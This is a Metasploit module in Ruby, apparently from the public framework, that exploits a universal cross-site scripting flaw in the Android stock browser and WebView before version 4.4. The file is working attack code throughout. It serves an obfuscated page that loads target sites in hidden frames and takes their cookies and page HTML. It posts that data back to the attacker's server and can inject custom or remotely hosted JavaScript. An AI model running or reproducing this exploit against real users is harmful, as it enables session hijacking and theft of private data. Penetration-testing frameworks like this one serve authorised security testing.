##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::JSObfu
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',
      'Description'    => %q{
        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
        all versions of Android's open source stock browser before 4.4, and Android apps running
        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
        to scrape both cookie data and page contents from a vulnerable browser window.

        Target URLs that use X-Frame-Options can not be exploited with this vulnerability.

        Some sample UXSS scripts are provided in data/exploits/uxss.
      },
      'Author'         => [
        'Rafay Baloch', # Original discovery, disclosure
        'joev'          # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'Actions'        => [
        [ 'WebServer' ]
      ],
      'PassiveActions' => [
        'WebServer'
      ],
      'References' => [
        [ 'URL', 'http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html'],
        [ 'URL', 'https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef' ],
        [ 'URL', 'http://trac.webkit.org/changeset/96826' ]
      ],
      'DefaultAction'  => 'WebServer',
      'DisclosureDate' => "Oct 4 2014"
    ))

    register_options([
      OptString.new('TARGET_URLS', [
        true,
        "The comma-separated list of URLs to steal.",
        'http://example.com'
      ]),
      OptString.new('CUSTOM_JS', [
        false,
        "A string of javascript to execute in the context of the target URLs.",
        ''
      ]),
      OptString.new('REMOTE_JS', [
        false,
        "A URL to inject into a script tag in the context of the target URLs.",
        ''
      ])
    ])
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")

    if request.method.downcase == 'post'
      collect_data(request)
      send_response_html(cli, '')
    else
      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))
      domains = datastore['TARGET_URLS'].split(',')

      script = js_obfuscate <<-EOS
        var targets = JSON.parse(atob("#{Rex::Text.encode_base64(JSON.generate(domains))}"));
        targets.forEach(function(target, i){
          var obj = document.createElement('object');
          obj.setAttribute('data', target);
          obj.setAttribute('style', 'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px');
          obj.onload = function() {
            obj.data = 'javascript:if(document&&document.body){(opener||top).postMessage('+
              'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+
              'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(custom_js)}"'+
              '));}void(0);';
            obj.innerHTML = '#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';
          };
          document.body.appendChild(obj);
        });

        window.addEventListener('message', function(e) {
          var data = JSON.parse(e.data);
          var x = new XMLHttpRequest;
          x.open('POST', window.location, true);
          x.send(e.data);
        }, false);

      EOS

      html = <<-EOS
        <html>
          <body>
            <script>
              #{script}
            </script>
          </body>
        </html>
      EOS

      print_status("Sending initial HTML ...")
      send_response_html(cli, html)
    end
  end

  def collect_data(request)
    begin
      response = JSON.parse(request.body)
    rescue JSON::ParserError
      print_error "Invalid JSON request."
    else
      url = response['url']
      if response && url
        file = store_loot("android.client", "text/plain", cli.peerhost, request.body, "aosp_uxss_#{url}", "Data pilfered from uxss")
        print_good "Collected data from URL: #{url}"
        print_good "Saved to: #{file}"
      end
    end
  end

  def custom_js
    rjs_hook + datastore['CUSTOM_JS']
  end

  def rjs_hook
    remote_js = datastore['REMOTE_JS']
    if remote_js.present?
      "var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); "
    else
      ''
    end
  end

  def run
    exploit
  end
end
